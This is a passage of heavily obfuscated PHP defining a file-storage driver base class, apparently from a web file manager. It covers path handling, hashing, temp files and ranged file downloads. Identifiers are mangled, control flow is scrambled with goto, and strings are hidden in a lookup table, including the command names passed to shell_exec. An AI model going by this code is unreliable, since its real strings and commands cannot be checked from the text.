(class_exists($aœ±ï…†ï[1954])) { return PEAR::isError($FÆ”‘·Æ, $CÒª¥ç­ë½); } elseif (is_object($FÆ”‘·Æ) && (get_class($FÆ”‘·Æ) == $aœ±ï…†ï[1955] || is_subclass_of($FÆ”‘·Æ, $aœ±ï…†ï[1955]))) { return !0; } return !1; } } goto fËâ¶ô±„; c‰»‡§ö¡¥: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $b‡ê‹ïì†È =& $_SERVER[“]; $this->objectDriver = array($b‡ê‹ïì†È[57], $b‡ê‹ïì†È[58], $b‡ê‹ïì†È[59], $b‡ê‹ïì†È[60], $b‡ê‹ïì†È[61], $b‡ê‹ïì†È[62], $b‡ê‹ïì†È[63], $b‡ê‹ïì†È[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C£ƒÍ‚˜É) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C£ƒÍ‚˜É, $_SERVER[“][8]); } return $C£ƒÍ‚˜É; } public function getPathName($d™³â„Üòè) { return $d™³â„Üòè; } public function iconvApp($Dƒ¶˜‡È¤‰) { return $Dƒ¶˜‡È¤‰; } public function iconvSystem($DªóŠ•ŠŠá) { return $DªóŠ•ŠŠá; } public function iconvTo($Eƒï‡¥†ø·, $a¹‡ùñŒàß, $F¥­¼“äö) { goto D„ñ÷„Ğ­ó; d†æÓ‰™£ö: $c²ÇÂ†‡Úµ = $c²ÇÂ†‡Úµ ? $c²ÇÂ†‡Úµ : $Eƒï‡¥†ø·; if (strstr($c²ÇÂ†‡Úµ, $CóÎáÎà°›[69])) { $c²ÇÂ†‡Úµ = str_replace($CóÎáÎà°›[69], $CóÎáÎà°›[70], $c²ÇÂ†‡Úµ); } $cÁ—ÖË«†[$a¹‡ùñŒàß . $CóÎáÎà°›[66] . $F¥­¼“äö . $CóÎáÎà°›[67] . $Eƒï‡¥†ø·] = $c²ÇÂ†‡Úµ; goto cŒ©ªÊÔ‘ã; D„ñ÷„Ğ­ó: $CóÎáÎà°› =& $_SERVER[“]; if (!$Eƒï‡¥†ø· || !function_exists($CóÎáÎà°›[65])) { return $Eƒï‡¥†ø·; } static $cÁ—ÖË«† = array(); goto b—ÀïàÁÇ†; b’àé¡Ğ¡¡: return $c²ÇÂ†‡Úµ; goto eŠ´™è»˜; b—ÀïàÁÇ†: $c´‚åì“½¡ = $a¹‡ùñŒàß . $CóÎáÎà°›[66] . $F¥­¼“äö . $CóÎáÎà°›[67] . $Eƒï‡¥†ø·; if (isset($cÁ—ÖË«†[$c´‚åì“½¡])) { return $cÁ—ÖË«†[$c´‚åì“½¡]; } if (function_exists($CóÎáÎà°›[68])) { $c²ÇÂ†‡Úµ = @mb_convert_encoding($Eƒï‡¥†ø·, $F¥­¼“äö, $a¹‡ùñŒàß); } else { $c²ÇÂ†‡Úµ = @iconv($a¹‡ùñŒàß, $F¥­¼“äö, $Eƒï‡¥†ø·); } goto d†æÓ‰™£ö; cŒ©ªÊÔ‘ã: $cÁ—ÖË«†[$F¥­¼“äö . $CóÎáÎà°›[66] . $a¹‡ùñŒàß . $CóÎáÎà°›[67] . $Eƒï‡¥†ø·] = $Eƒï‡¥†ø·; $cÁ—ÖË«†[$F¥­¼“äö . $CóÎáÎà°›[66] . $a¹‡ùñŒàß . $CóÎáÎà°›[67] . $c²ÇÂ†‡Úµ] = $Eƒï‡¥†ø·; $cÁ—ÖË«†[$a¹‡ùñŒàß . $CóÎáÎà°›[66] . $F¥­¼“äö . $CóÎáÎà°›[67] . $c²ÇÂ†‡Úµ] = $c²ÇÂ†‡Úµ; goto b’àé¡Ğ¡¡; eŠ´™è»˜: } public function getPathInner($c×Ñ¾Éàñà) { $f¶–¹“ˆÊ = IO::init($c×Ñ¾Éàñà); return $f¶–¹“ˆÊ->path; } public function getPathOuter($F’Ñ£¶´¸¶) { $cØ§Ì†£Ï =& $_SERVER[“]; $FæÛ´…½© = strlen(trim($this->pathBase, $cØ§Ì†£Ï[8])); $F’Ñ£¶´¸¶ = substr(trim($F’Ñ£¶´¸¶, $cØ§Ì†£Ï[8]), $FæÛ´…½©); return $this->pathDriver . $cØ§Ì†£Ï[8] . ltrim($F’Ñ£¶´¸¶, $cØ§Ì†£Ï[8]); } public function isParentOf($A‹¿…ïÓ«, $C›˜¸¯ç¨) { $C”í˜Ï­Ûª =& $_SERVER[“]; $A‹¿…ïÓ« = rtrim(strtolower($A‹¿…ïÓ«), $C”í˜Ï­Ûª[8]) . $C”í˜Ï­Ûª[8]; $C›˜¸¯ç¨ = rtrim(strtolower($C›˜¸¯ç¨), $C”í˜Ï­Ûª[8]) . $C”í˜Ï­Ûª[8]; $C˜ëÃÊÒŠ´ = strpos($C›˜¸¯ç¨, $A‹¿…ïÓ«) === 0; return $C˜ëÃÊÒŠ´; } public function getType() { $AåÌœÆ†§½ =& $_SERVER[“]; $c×ğÕùæÉ¡ = str_replace($AåÌœÆ†§½[71], $AåÌœÆ†§½[33], get_class($this)); return strtolower($c×ğÕùæÉ¡); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($B©­™ãïÕó, $E¬Š‚óÈè) { $a¥òÅ¼Ëöµ =& $_SERVER[“]; $Cº›¬†êµÜ = rtrim($B©­™ãïÕó, $a¥òÅ¼Ëöµ[8]) . $a¥òÅ¼Ëöµ[8] . $E¬Š‚óÈè; $eƒ®Å ”ì = $this->exist($Cº›¬†êµÜ); return $eƒ®Å ”ì ? $Cº›¬†êµÜ : !1; } public function setModifyTime($DƒÀšâµî, $A„Ší×ª½Ì = '') { } public function renameObject($aÅĞá¥·øì, $C‡Ô·†ôµ) { goto a³÷åõ†Ô; Fƒ¶í…¹–Ù: $aÅĞá¥·øì = $this->getPathOuter($aÅĞá¥·øì); $C‡Ô·†ôµ = $this->pathFather($aÅĞá¥·øì) . $C‡Ô·†ôµ; if (IO::isFile($aÅĞá¥·øì)) { $b‘ğé×‘ù¨ = IO::copy($aÅĞá¥·øì, $this->pathFather($aÅĞá¥·øì), REPEAT_RENAME_FOLDER, $D‚Òîêóæ); if ($b‘ğé×‘ù¨) { IO::remove($aÅĞá¥·øì); } } else { $b‘ğé×‘ù¨ = IO::mkdir($C‡Ô·†ôµ); if (!$b‘ğé×‘ù¨) { return !1; } $aŒ“İ©ğÛ = IO::listPath($aÅĞá¥·øì, !0); $aÒğéŞÒŒ = array_merge($aŒ“İ©ğÛ[$E‰Ëˆ£¡˜Ğ[73]], $aŒ“İ©ğÛ[$E‰Ëˆ£¡˜Ğ[74]]); foreach ($aÒğéŞÒŒ as $CŠ÷‡ó‚‚) { IO::move($CŠ÷‡ó‚‚[$E‰Ëˆ£¡˜Ğ[75]], $C‡Ô·†ôµ, REPEAT_RENAME_FOLDER); } IO::remove($aÅĞá¥·øì); } goto B¨ïóÃŸÁ±; a³÷åõ†Ô: $E‰Ëˆ£¡˜Ğ =& $_SERVER[“]; $D‚Òîêóæ = $C‡Ô·†ôµ; Hook::trigger($E‰Ëˆ£¡˜Ğ[72], $this, $aÅĞá¥·øì, $this, $this->pathFather($aÅĞá¥·øì) . $C‡Ô·†ôµ); goto Fƒ¶í…¹–Ù; B¨ïóÃŸÁ±: return $b‘ğé×‘ù¨ ? $C‡Ô·†ôµ : !1; goto dªÆšä·›æ; dªÆšä·›æ: } public function tempFile($aåè÷ØÌáˆ = '', $A˜‘‰°‘ğ = '') { goto b™àêÇòâ; b°œíË‰±: return $C‹òËè’; goto f× ¼Îù¦; cÉßôàõ—ñ: $C‹òËè’ = $f»œŠ¤¤ . $aåè÷ØÌáˆ; @touch($C‹òËè’); if ($A˜‘‰°‘ğ) { file_put_contents($C‹òËè’, $A˜‘‰°‘ğ); } goto b°œíË‰±; b™àêÇòâ: if (!$aåè÷ØÌáˆ) { $aåè÷ØÌáˆ = rand_string(15); } $f»œŠ¤¤ = TEMP_FILES . rand_string(15) . $_SERVER[“][8]; @mkdir($f»œŠ¤¤, 511, !0); goto cÉßôàõ—ñ; f× ¼Îù¦: } public function tempFileRemve($E…‹Ù§£›) { @unlink($E…‹Ù§£›); @rmdir($this->pathFather($E…‹Ù§£›)); } public function mkfile($E®¢ªù³¶, $CŞÙÎÖÆƒ© = '', $dĞ†é®ÊÔ = REPEAT_RENAME) { } public function mkdir($B´®ìÌÎ×, $e¶ø’æ…¿— = REPEAT_SKIP) { } public function delFile($aé¯õÂ‰°¯) { } public function delFolder($c…¶Á—¢ïØ) { } public function copyFile($EîÖ‚øä‡, $d¤‹©É‘ëç) { } public function moveFile($eîº«˜Äí, $D…‡’ö©Éª) { } public function remove($FöÖš†‡…Û) { if ($this->isFile($FöÖš†‡…Û)) { return $this->delFile($FöÖš†‡…Û); } return $this->delFolder($FöÖš†‡…Û); } public function rename($eîà¯¥‘ì‰, $A¾ù‡ŒöŒ) { } public function exist($dó¦Ô–¿¦) { } public function findByHash($dæ¹¿‡Õ‰• = '', $FÌ¸±ô¹š = '') { return !1; } public function isFile($B°°ìóË) { } public function isFolder($dÍ‘µº) { } public function size($E«ùéí¸‹”) { } public function info($c—Í˜£‚’ ) { } public function infoSimple($a–çïÀóŸ) { return $this->info($a–çïÀóŸ); } public function infoAuth($B½É†‹¹”º) { return $this->info($B½É†‹¹”º); } public function infoFull($EÃÏì¾Ú Ô) { return $this->info($EÃÏì¾Ú Ô); } public function infoWithChildren($BÙ©£ƒÎ­) { $AÙ…·ÒÍİ­ =& $_SERVER[“]; static $a‹õ¦åó = array(); if (isset($a‹õ¦åó[$BÙ©£ƒÎ­])) { return $a‹õ¦åó[$BÙ©£ƒÎ­]; } $Aã”À‚Ñ²Ù = $this->info($BÙ©£ƒÎ­); if ($Aã”À‚Ñ²Ù && $Aã”À‚Ñ²Ù[$AÙ…·ÒÍİ­[29]] == $AÙ…·ÒÍİ­[76]) { $f½ÉºÎ±¦‹ = array($AÙ…·ÒÍİ­[77] => 0, $AÙ…·ÒÍİ­[78] => 0, $AÙ…·ÒÍİ­[79] => 0); $this->infoChildren($BÙ©£ƒÎ­, $f½ÉºÎ±¦‹); $Aã”À‚Ñ²Ù[$AÙ…·ÒÍİ­[77]] = $f½ÉºÎ±¦‹[$AÙ…·ÒÍİ­[77]]; $Aã”À‚Ñ²Ù[$AÙ…·ÒÍİ­[80]] = array($AÙ…·ÒÍİ­[81] => $f½ÉºÎ±¦‹[$AÙ…·ÒÍİ­[78]], $AÙ…·ÒÍİ­[82] => $f½ÉºÎ±¦‹[$AÙ…·ÒÍİ­[79]]); $a‹õ¦åó[$BÙ©£ƒÎ­] = $Aã”À‚Ñ²Ù; } return $Aã”À‚Ñ²Ù; } public function listPath($D†…‡ĞÑ‰‡, $EÚô”í—Ê = false) { } public function has($aîä‘Ú®è», $a›ËòÅôÃ· = false, $eëĞÖ‚ÓŒ– = false) { } public function canRead($d±ï½‘¯Íì) { } public function canWrite($fŠ¡ëÄä‡ä) { } public function getContent($Dáã¢¢ŸŠ›) { } public function setContent($cîñèÓÕ, $F‘µ˜²³ = '') { } protected function infoChildren($aÚ¬¶¦ğÁ, &$eæòìÍ¦Ç) { $BÉøÚ²ò… =& $_SERVER[“]; check_abort(); $Cö‚¸—©‹Ù = $this->listPath($aÚ¬¶¦ğÁ, !0); $Cö‚¸—©‹Ù = array_merge($Cö‚¸—©‹Ù[$BÉøÚ²ò…[74]], $Cö‚¸—©‹Ù[$BÉøÚ²ò…[73]]); foreach ($Cö‚¸—©‹Ù as $d±‘ã…˜ô—) { if ($d±‘ã…˜ô—[$BÉøÚ²ò…[29]] == $BÉøÚ²ò…[76]) { $eæòìÍ¦Ç[$BÉøÚ²ò…[79]]++; $cÇ‹¨æíİä = $this->getPathInner($d±‘ã…˜ô—[$BÉøÚ²ò…[75]]); $this->infoChildren($cÇ‹¨æíİä, $eæòìÍ¦Ç); } else { $eæòìÍ¦Ç[$BÉøÚ²ò…[78]]++; $eæòìÍ¦Ç[$BÉøÚ²ò…[77]] += $d±‘ã…˜ô—[$BÉøÚ²ò…[77]]; } } } public function fileSubstr($aœÛç³ÎÍ, $E¢²‰•—é, $aîê®ë––) { } public function listAll($e»Â‹‰‚¬œ) { } public function upload($AÛ´É£‹ªë, $ašé­·ª‚, $FÏ©—‘Ï‹Ç = false, $CĞºùÂ…½ = REPEAT_REPLACE) { } public function uploadFileByID($C„ç¨½Ú´, $bŞ†Ú„‘‰—, $aäê«íÎª) { } public function uploadFileByPath($Fª‘ì½“’Ë, $d“£°ÇñÀ–, $EÎù„çïí„ = array()) { } public function isUploadServer() { $dÇÔß´åªï =& $_SERVER[“]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dÇÔß´åªï[83]) { return !0; } return $GLOBALS[$dÇÔß´åªï[6]][$dÇÔß´åªï[84]][$dÇÔß´åªï[85]]; } public function isFileOutServer() { $D‹¢›Öô =& $_SERVER[“]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $D‹¢›Öô[83]) { return !0; } return $GLOBALS[$D‹¢›Öô[6]][$D‹¢›Öô[84]][$D‹¢›Öô[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($eÑî‘Ôåù†) { $B¦ô´™»™Ø =& $_SERVER[“]; if (!$this->isCdnHost()) { return $eÑî‘Ôåù†; } return str_replace(trim(get_url_root($eÑî‘Ôåù†), $B¦ô´™»™Ø[8]), trim($this->cdnHost, $B¦ô´™»™Ø[8]), $eÑî‘Ôåù†); } public function uploadLink($dŸºŠ‚Ü¤ù, $Aãò–Çßñ· = 0) { goto A°†ğæŒÜµ; A°†ğæŒÜµ: $c…¡ˆ™¿‰æ =& $_SERVER[“]; if ($this->isUploadServer()) { return; } $BĞï¢ª = $this->getType(); goto e‹°¢Ö‡ö¯; Bº÷‹¹Ë©ö: $B·¦Ô„´µ½ = $Aãò–Çßñ· <= $c„´¾î½”£ ? $c…¡ˆ™¿‰æ[87] : $c…¡ˆ™¿‰æ[88]; $aÇáÓî…‰‰ = (!$Aãò–Çßñ· ? 1 : ceil($Aãò–Çßñ· / pow(1024, 3))) * 3600 * 4; $fí†ÓÚİÍ = $this->{$B·¦Ô„´µ½}($dŸºŠ‚Ü¤ù, $aÇáÓî…‰‰); goto e˜ô”ª…£ƒ; e‹°¢Ö‡ö¯: if (!in_array($BĞï¢ª, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $c„´¾î½”£ = 1024 * 1024 * 10; goto Bº÷‹¹Ë©ö; e˜ô”ª…£ƒ: if ($fí†ÓÚİÍ) { $fí†ÓÚİÍ[$c…¡ˆ™¿‰æ[89]] = $dŸºŠ‚Ü¤ù; $fí†ÓÚİÍ[$c…¡ˆ™¿‰æ[90]] = $BĞï¢ª; } return $fí†ÓÚİÍ; goto BŞÛóŠÓ Ó; BŞÛóŠÓ Ó: } public function uploadFormData($EĞîä†•ªè, $dÊ·èÕÈªÊ = 3600) { } public function multiUploadFormData($dğĞêè‰êß, $C²Ç‡ˆ”Ñ = 3600) { } public function download($cÀ¢µ¤½ÕÍ, $E×ĞŒ‚òÏÒ) { } public function ext($F´…½ªñî) { $A»°‘à©İÛ =& $_SERVER[“]; if (strpos($F´…½ªñî, $A»°‘à©İÛ[8]) === -1) { $e¤ùƒí‘åò = $F´…½ªñî; } else { $e¤ùƒí‘åò = $this->pathThis($F´…½ªñî); } $EßÆŠÛÛ» = $A»°‘à©İÛ[33]; if (strstr($e¤ùƒí‘åò, $A»°‘à©İÛ[91])) { $EßÆŠÛÛ» = substr($e¤ùƒí‘åò, strrpos($e¤ùƒí‘åò, $A»°‘à©İÛ[91]) + 1); $EßÆŠÛÛ» = strtolower($EßÆŠÛÛ»); } if (strlen($EßÆŠÛÛ») > 3 && preg_match($A»°‘à©İÛ[92], $EßÆŠÛÛ», $f†Ø‰×çËÔ)) { $EßÆŠÛÛ» = $A»°‘à©İÛ[33]; } return $EßÆŠÛÛ»; } public function pathThis($CÖ•ßé¥Ô‰) { $AµÇ†º¬ =& $_SERVER[“]; $CÖ•ßé¥Ô‰ = str_replace($AµÇ†º¬[93], $AµÇ†º¬[8], rtrim($CÖ•ßé¥Ô‰, $AµÇ†º¬[8])); $EùÒ²Ëò‚ = strrpos($CÖ•ßé¥Ô‰, $AµÇ†º¬[8]); if ($EùÒ²Ëò‚ === !1) { return $CÖ•ßé¥Ô‰; } return substr($CÖ•ßé¥Ô‰, $EùÒ²Ëò‚ + 1); } public function pathFather($BÊ™¹é‚¿á) { $aÎå£Í³„Ù =& $_SERVER[“]; $BÊ™¹é‚¿á = str_replace($aÎå£Í³„Ù[93], $aÎå£Í³„Ù[8], rtrim($BÊ™¹é‚¿á, $aÎå£Í³„Ù[8])); $BæëéŸÒâ = strrpos($BÊ™¹é‚¿á, $aÎå£Í³„Ù[8]); if ($BæëéŸÒâ === !1) { return $aÎå£Í³„Ù[33]; } return substr($BÊ™¹é‚¿á, 0, $BæëéŸÒâ + 1); } public function hashSimple($aÆ¨ÁÔ‡©) { goto dôˆ‰ïÉ®¤; c³ß§Òİèà: $D®Õçà“¯í .= $this->fileSubstr($aÆ¨ÁÔ‡©, $DÎ¶½ò³‡ - $Dƒ¬ô‡„†Ş, $Dƒ¬ô‡„†Ş); return md5($D®Õçà“¯í) . $DÎ¶½ò³‡; goto Bˆ¬Â‰†ó–; AÈ‘–Š’„: $BƒÂå“´šå = intval($DÎ¶½ò³‡ / $a ËíŠ‚Ùå); $D®Õçà“¯í = $f»²“Ö¶‘æ[33]; for ($a–Ü¹ƒÚ¶¿ = 0; $a–Ü¹ƒÚ¶¿ < $a ËíŠ‚Ùå; $a–Ü¹ƒÚ¶¿++) { $D®Õçà“¯í .= $this->fileSubstr($aÆ¨ÁÔ‡©, $BƒÂå“´šå * $a–Ü¹ƒÚ¶¿, $Dƒ¬ô‡„†Ş); } goto c³ß§Òİèà; DÏôÅÔÔ«: $Dƒ¬ô‡„†Ş = 200; $a ËíŠ‚Ùå = 50; if ($DÎ¶½ò³‡ <= $Dƒ¬ô‡„†Ş * $a ËíŠ‚Ùå) { return $this->hashMd5($aÆ¨ÁÔ‡©) . $DÎ¶½ò³‡; } goto AÈ‘–Š’„; dôˆ‰ïÉ®¤: $f»²“Ö¶‘æ =& $_SERVER[“]; if (!$aÆ¨ÁÔ‡©) { return md5($f»²“Ö¶‘æ[33]); } $DÎ¶½ò³‡ = $this->size($aÆ¨ÁÔ‡©); goto DÏôÅÔÔ«; Bˆ¬Â‰†ó–: } public static $md5Cache = array(); public function hashMd5($e¬¿ù¸ÇÉÆ) { $e¬¿ù¸ÇÉÆ = $this->iconvSystem($e¬¿ù¸ÇÉÆ); if (isset(self::$md5Cache[$e¬¿ù¸ÇÉÆ])) { return self::$md5Cache[$e¬¿ù¸ÇÉÆ]; } self::$md5Cache[$e¬¿ù¸ÇÉÆ] = $this->hashMd5Shell($e¬¿ù¸ÇÉÆ); if (!self::$md5Cache[$e¬¿ù¸ÇÉÆ]) { self::$md5Cache[$e¬¿ù¸ÇÉÆ] = @md5_file($e¬¿ù¸ÇÉÆ); } return self::$md5Cache[$e¬¿ù¸ÇÉÆ]; } private function hashMd5Shell($fó÷ìŠ®¤ô) { goto FòßÀ‘¹á’; då¤ïÒ‰±: $F´øùàÁÀ = Cache::get($eÎŸŞŒÒÒà[97]); if (!$F´øùàÁÀ) { $A ŒñøÌ½ = BASIC_PATH . $eÎŸŞŒÒÒà[98]; $dÃ‡±í§ÀÔ = md5_file($A ŒñøÌ½); $F´øùàÁÀ = $eÎŸŞŒÒÒà[99]; foreach ($E‡Üš¤æ” as $f±­Šµ„œ) { $F™«åÔæß  = shell_exec($f±­Šµ„œ . "\40\x22{$A ŒñøÌ½}\x22"); if ($F™«åÔæß  && substr(trim($F™«åÔæß ), 0, 32) == $dÃ‡±í§ÀÔ) { $F´øùàÁÀ = $f±­Šµ„œ; break; } } Cache::set($eÎŸŞŒÒÒà[97], $F´øùàÁÀ, 3600); } if ($F´øùàÁÀ == $eÎŸŞŒÒÒà[99]) { return !1; } goto b¢ ñô²‚; FòßÀ‘¹á’: $eÎŸŞŒÒÒà =& $_SERVER[“]; if (!function_exists($eÎŸŞŒÒÒà[94])) { return !1; } $E‡Üš¤æ” = array($eÎŸŞŒÒÒà[95], $eÎŸŞŒÒÒà[96]); goto då¤ïÒ‰±; b¢ ñô²‚: $F™«åÔæß  = shell_exec($F´øùàÁÀ . "\40\x22{$fó÷ìŠ®¤ô}\x22"); $F™«åÔæß  = str_replace($eÎŸŞŒÒÒà[100], $eÎŸŞŒÒÒà[33], $F™«åÔæß ); return substr($F™«åÔæß , 0, 32); goto eè§È¥ƒ¶å; eè§È¥ƒ¶å: } public function link($eŸ¥¨˜ß¾ˆ) { return $eŸ¥¨˜ß¾ˆ; } public function fileOut($f˜œ¨¢¿ö, $d¥¤º„÷ÔË = false, $D‹Á´òÃ”Ø = false, $añ÷–ÉçŒ = '') { goto Fóå¬Ô÷õß; f»ì§óïÚÆ: if (in_array($eÅÁî˜í¨ë, array($b‡ôï¨‹µ„[108], $b‡ôï¨‹µ„[109], $b‡ôï¨‹µ„[110], $b‡ôï¨‹µ„[111]))) { $eÅÁî˜í¨ë = $b‡ôï¨‹µ„[112]; } if (!$añ÷–ÉçŒ) { $añ÷–ÉçŒ = md5($CÈ„´´ô“„ . $this->hashSimple($f˜œ¨¢¿ö)); } $añ÷–ÉçŒ = $b‡ôï¨‹µ„[113] . $añ÷–ÉçŒ . $b‡ôï¨‹µ„[113]; goto fÚß¨µÏ–‚; BÃ¤¯‘‚…•: if ($e‡ö¦†šç¬) { $c–‰º¢´¶‰ = intval(1000 * 1000 * ($DÚó‚ÇñÅ¨ / $e‡ö¦†šç¬)); } while ($cÃ‹ÎÆ†â‘ <= $CŒñ±ÔÈ†) { $e¾å«¼£Ëù = timeFloat(); check_abort(); $Dß£ĞäÇ¸ = $CŒñ±ÔÈ† - $cÃ‹ÎÆ†â‘ + 1; if ($Dß£ĞäÇ¸ <= $DÚó‚ÇñÅ¨) { $DÚó‚ÇñÅ¨ = $Dß£ĞäÇ¸; } echo $this->fileSubstr($f˜œ¨¢¿ö, $cÃ‹ÎÆ†â‘, $DÚó‚ÇñÅ¨); $cÃ‹ÎÆ†â‘ += $DÚó‚ÇñÅ¨; if ($DÚó‚ÇñÅ¨ == $Dß£ĞäÇ¸) { $cÃ‹ÎÆ†â‘ = $CŒñ±ÔÈ† + 1; } if ($c–‰º¢´¶‰) { $A¹ç´«  = intval(1000 * 1000 * (timeFloat() - $e¾å«¼£Ëù)); $AİÜÆÍ×‚ã = $c–‰º¢´¶‰ - $A¹ç´« ; if ($AİÜÆÍ×‚ã > 5) { usleep($AİÜÆÍ×‚ã); } } } goto F£éÆÚ²éè; aß„¢¦ßÌŞ: $DÏÚ‘¾ƒ¯ = $e¯Å¢éŒ§[$b‡ôï¨‹µ„[77]]; $CÈ„´´ô“„ = gmdate($b‡ôï¨‹µ„[106], $e¯Å¢éŒ§[$b‡ôï¨‹µ„[107]]); $dÜ¦êÀŞ›³ = $D‹Á´òÃ”Ø ? $D‹Á´òÃ”Ø : $this->iconvApp($e¯Å¢éŒ§[$b‡ôï¨‹µ„[28]]); goto dİ­°ÛåÀ; dİ­°ÛåÀ: $cÃ‹ÎÆ†â‘ = 0; $CŒñ±ÔÈ† = $DÏÚ‘¾ƒ¯ - 1; $eÅÁî˜í¨ë = $this->ext($dÜ¦êÀŞ›³); goto f»ì§óïÚÆ; C¦„»­àÅ: $eŒÚ·‹”±ò = strtolower($_SERVER[$b‡ôï¨‹µ„[139]]); if ($DªÇ¶Ş¯‰ && $eŒÚ·‹”±ò && $c§‚ÇçÅ) { if (strstr($eŒÚ·‹”±ò, $b‡ôï¨‹µ„[140])) { header($b‡ôï¨‹µ„[141] . $f˜œ¨¢¿ö); } else { if (strstr($eŒÚ·‹”±ò, $b‡ôï¨‹µ„[142])) { header($b‡ôï¨‹µ„[143] . $f˜œ¨¢¿ö); } else { if (strstr($eŒÚ·‹”±ò, $b‡ôï¨‹µ„[144])) { header($b‡ôï¨‹µ„[145] . $f˜œ¨¢¿ö); } } } if ($e‡ö¦†šç¬) { header($b‡ôï¨‹µ„[146] . $e‡ö¦†šç¬); } return; } if (isset($_SERVER[$b‡ôï¨‹µ„[147]])) { if (preg_match($b‡ôï¨‹µ„[148], $_SERVER[$b‡ôï¨‹µ„[147]], $a£…†ñ–ù)) { $cÃ‹ÎÆ†â‘ = intval($a£…†ñ–ù[1]); if (!empty($a£…†ñ–ù[2])) { $CŒñ±ÔÈ† = intval($a£…†ñ–ù[2]); } } header($b‡ôï¨‹µ„[149]); header("\x43\157\x6e\x74\x65\x6e\164\x2d\x52\x61\x6e\147\145\x3a\40\142\x79\x74\x65\x73\x20{$cÃ‹ÎÆ†â‘}\x2d{$CŒñ±ÔÈ†}\57" . $DÏÚ‘¾ƒ¯); } else { header($b‡ôï¨‹µ„[150]); } goto FÓÄĞÓ®‰; eÌóõÚ”œÚ: $dİˆ¬İÓ¹ = rawurlencode($dÜ¦êÀŞ›³); $dİˆ¬İÓ¹ = $b‡ôï¨‹µ„[113] . $dİˆ¬İÓ¹ . $b‡ôï¨‹µ„[117] . $dİˆ¬İÓ¹; if ($d¥¤º„÷ÔË) { header($b‡ôï¨‹µ„[118]); header($b‡ôï¨‹µ„[119] . $dİˆ¬İÓ¹); } else { header($b‡ôï¨‹µ„[120] . $dİˆ¬İÓ¹); } goto dÏ»­÷‰„ª; a®º†²·´Ş: if (isset($_SERVER[$b‡ôï¨‹µ„[128]]) && strtotime($_SERVER[$b‡ôï¨‹µ„[128]]) == $e¯Å¢éŒ§[$b‡ôï¨‹µ„[107]]) { header($b‡ôï¨‹µ„[129], !0, 304); die; } if (isset($_SERVER[$b‡ôï¨‹µ„[130]]) && $_SERVER[$b‡ôï¨‹µ„[130]] == $añ÷–ÉçŒ) { header($b‡ôï¨‹µ„[131] . $añ÷–ÉçŒ, !0, 304); die; } header($b‡ôï¨‹µ„[131] . $añ÷–ÉçŒ); goto cœİğõÄ—¼; eˆ­–Í¸¨: $DªÇ¶Ş¯‰ = $this->getType() == $b‡ôï¨‹µ„[102]; $c§‚ÇçÅ = $GLOBALS[$b‡ôï¨‹µ„[6]][$b‡ôï¨‹µ„[84]][$b‡ôï¨‹µ„[103]][$b‡ôï¨‹µ„[104]]; $e‡ö¦†šç¬ = (double) $GLOBALS[$b‡ôï¨‹µ„[6]][$b‡ôï¨‹µ„[84]][$b‡ôï¨‹µ„[103]][$b‡ôï¨‹µ„[105]] * 1024 * 1024; goto E§¯’Â¦Ûª; dÏ»­÷‰„ª: header($b‡ôï¨‹µ„[121]); header($b‡ôï¨‹µ„[122] . $CƒÛ·Õ‡ŠÜ); header($b‡ôï¨‹µ„[123] . gmdate($b‡ôï¨‹µ„[106], time() + 3600 * 24 * 30) . $b‡ôï¨‹µ„[124]); goto aí›Â…Ö•Ø; Fóå¬Ô÷õß: $b‡ôï¨‹µ„ =& $_SERVER[“]; $this->cacheMethod(null, null); if (!$f˜œ¨¢¿ö || !$this->exist($f˜œ¨¢¿ö)) { show_json(LNG($b‡ôï¨‹µ„[101]), !1, $D‹Á´òÃ”Ø); } goto eˆ­–Í¸¨; cœİğõÄ—¼: header($b‡ôï¨‹µ„[132] . $CÈ„´´ô“„ . $b‡ôï¨‹µ„[124]); header($b‡ôï¨‹µ„[133] . $dÜ¦êÀŞ›³); header($b‡ôï¨‹µ„[134]); goto bŸŸÜ´Ö‹µ; E§¯’Â¦Ûª: @ob_end_clean(); set_timeout(); $e¯Å¢éŒ§ = $this->infoFull($f˜œ¨¢¿ö); goto aß„¢¦ßÌŞ; fÚß¨µÏ–‚: $CƒÛ·Õ‡ŠÜ = get_file_mime($eÅÁî˜í¨ë); if (strstr($CƒÛ·Õ‡ŠÜ, $b‡ôï¨‹µ„[114])) { $CƒÛ·Õ‡ŠÜ = $CƒÛ·Õ‡ŠÜ . $b‡ôï¨‹µ„[115]; } if ($d¥¤º„÷ÔË === !1 && !mime_support($CƒÛ·Õ‡ŠÜ)) { $d¥¤º„÷ÔË = !0; $CƒÛ·Õ‡ŠÜ = $b‡ôï¨‹µ„[116]; } goto eÌóõÚ”œÚ; aí›Â…Ö•Ø: header($b‡ôï¨‹µ„[125]); header($b‡ôï¨‹µ„[126]); header($b‡ôï¨‹µ„[127]); goto a®º†²·´Ş; bŸŸÜ´Ö‹µ: header($b‡ôï¨‹µ„[135] . $DÏÚ‘¾ƒ¯); header($b‡ôï¨‹µ„[136]); if (!$d¥¤º„÷ÔË && $eÅÁî˜í¨ë == $b‡ôï¨‹µ„[137]) { if ($DÏÚ‘¾ƒ¯ > 1024 * 1024 * 5) { die; } $aº±Ü—÷ = $this->getContent($f˜œ¨¢¿ö); $aº±Ü—÷ = Html::clearSVG($aº±Ü—÷); header($b‡ôï¨‹µ„[138] . $DÏÚ‘¾ƒ¯); echo $aº±Ü—÷; die; } goto C¦„»­àÅ; e‰Úëäë†×: if ($_SERVER[$b‡ôï¨‹µ„[154]] == $b‡ôï¨‹µ„[155]) { return; } $DÚó‚ÇñÅ¨ = 1024 * 100; $c–‰º¢´¶‰ = 0; goto BÃ¤¯‘‚…•; FÓÄĞÓ®‰: $aö¶Êöª¹‹ = !0; if ($_SERVER[$b‡ôï¨‹µ„[151]] == $b‡ôï¨‹µ„[152] && $DÏÚ‘¾ƒ¯ > 1204 * 1024 * 1024 * 2) { $aö¶Êöª¹‹ = !1; } if ($aö¶Êöª¹‹) { header($b‡ôï¨‹µ„[153] . ($CŒñ±ÔÈ† - $cÃ‹ÎÆ†â‘ + 1)); } goto e‰Úëäë†×; 